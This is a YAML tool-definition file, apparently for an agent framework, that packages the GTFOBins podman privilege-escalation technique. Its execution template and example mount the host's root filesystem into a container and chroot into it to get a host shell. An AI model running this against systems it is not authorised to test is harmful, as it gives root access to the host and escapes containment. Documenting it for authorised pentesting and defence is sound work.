---
id: container-podman-podman
namespace: container:podman:podman
name: podman
description: Container runtime, can spawn privileged containers with host access.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - docker
  - lxd
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 32
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: low
  disk_io: low
allowed-tools:
  - podman
  - docker
  - Bash
  - execFile
parameters: []
features:
  - requires-root
  - process-manip
execution:
  template: "podman run -v /:/mnt --rm -it alpine /bin/sh"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn privileged container with host access
    command: podman run -v /:/mnt --rm -it alpine sh -c 'chroot /mnt'
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/podman/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "podman"
    commands:
      - "apt-get install -y podman"
---
